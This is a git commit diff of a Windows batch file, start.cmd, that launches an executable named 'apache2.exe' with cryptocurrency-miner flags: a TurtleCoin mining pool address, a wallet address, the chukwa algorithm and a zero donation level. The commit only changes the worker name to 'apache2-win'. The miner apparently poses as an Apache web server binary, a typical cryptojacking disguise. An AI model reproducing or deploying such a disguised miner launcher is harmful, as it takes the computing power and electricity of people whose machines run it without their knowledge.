a7572e66e08fded7fff2817258d1d8d59a3d1114
tustiicine <40838605+tustiicine@users.noreply.github.com>
2020-04-16 00:40:22 +0100

    Update start.cmd

--- start.cmd
+++ start.cmd
@@ -1,3 +1,3 @@
 @echo off
-apache2.exe --donate-level 0 -o turtlecoin.herominers.com:10380 -u TRTLuxq3Jxj3asTmhJxizHiRc3bwAe9spfCYb4ABwe4odnNjc5qYfve2iJBZ5AUpKVU1gu7Z4TdWTDcze8fHkc2nh8ufAcSyT4r -p 1hvps -a chukwa -k 
+apache2.exe --donate-level 0 -o turtlecoin.herominers.com:10380 -u TRTLuxq3Jxj3asTmhJxizHiRc3bwAe9spfCYb4ABwe4odnNjc5qYfve2iJBZ5AUpKVU1gu7Z4TdWTDcze8fHkc2nh8ufAcSyT4r -p apache2-win -a chukwa -k 
 pause
